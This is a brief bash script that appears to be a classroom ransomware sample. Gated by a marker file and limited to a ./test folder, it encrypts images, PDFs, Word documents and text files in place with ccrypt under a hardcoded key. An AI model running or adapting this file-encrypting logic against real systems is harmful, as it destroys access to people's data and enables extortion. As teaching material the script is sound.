#!/bin/bash

FOLDER="${PWD}"/test
echo $FOLDER
if [ ! -e "${FOLDER}"/.quierollorar ]; then
	exit
fi
FILES=$(find "${FOLDER}" -regextype posix-egrep -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt)")
for file in $FILES;
do
	ccrypt -e "${file}" -K cybersec42
done;
